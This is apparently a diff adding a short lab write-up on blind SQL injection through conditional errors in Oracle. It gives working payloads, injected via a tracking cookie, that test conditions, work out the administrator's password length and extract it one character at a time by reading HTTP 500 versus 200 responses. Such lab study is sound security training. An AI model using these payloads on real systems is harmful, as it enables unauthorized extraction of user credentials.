@@ -1,0 +1,67 @@
+Blind SQL Injection — Conditional Errors (Oracle)
+Overview
+
+This lab exploits a Blind SQL Injection using conditional database errors.
+The application reveals information through HTTP status code changes when an SQL error is triggered.
+
+Technical Context
+
+Injection point: tracking cookie
+
+Database engine: Oracle
+
+Target account: administrator
+
+Oracle String Concatenation
+
+Oracle requires explicit string concatenation and a table reference:
+
+'||(SELECT 'a' FROM dual)||'
+
+Triggering Conditional Errors
+'||(
+SELECT CASE
+WHEN (1=1)
+THEN TO_CHAR(1/0)
+ELSE ''
+END
+FROM users
+WHERE username='administrator'
+)||'
+
+Behavior
+
+1/0 causes a division-by-zero error
+
+HTTP 500 indicates a true condition
+
+HTTP 200 indicates a false condition
+
+Password Length Enumeration
+'||(
+SELECT CASE
+WHEN (LENGTH(password)=20)
+THEN TO_CHAR(1/0)
+ELSE ''
+END
+FROM users
+WHERE username='administrator'
+)||'
+
+Password Extraction
+'||(
+SELECT CASE
+WHEN (SUBSTR(password,1,1)='a')
+THEN TO_CHAR(1/0)
+ELSE ''
+END
+FROM users
+WHERE username='administrator'
+)||'
+
+
+The process is repeated for each character position.
+
+Conclusion
+
+Conditional errors can be abused as a reliable side channel to extract sensitive data from Oracle databases.
